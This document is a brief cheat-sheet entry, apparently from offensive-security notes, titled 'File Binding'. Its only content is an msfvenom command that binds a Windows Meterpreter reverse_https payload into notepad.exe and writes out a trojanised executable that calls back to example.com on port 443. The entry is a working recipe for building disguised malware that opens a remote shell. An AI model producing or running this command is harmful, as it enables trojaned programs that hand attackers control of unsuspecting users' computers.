## File Binding

### Executable files

```bash
msfvenom -a x86 --platform windows -x notepad.exe -k -p windows/meterpreter/reverse_https lhost=example.com lport=443 -b "\x00" -f exe -o new_notepad.exe
```
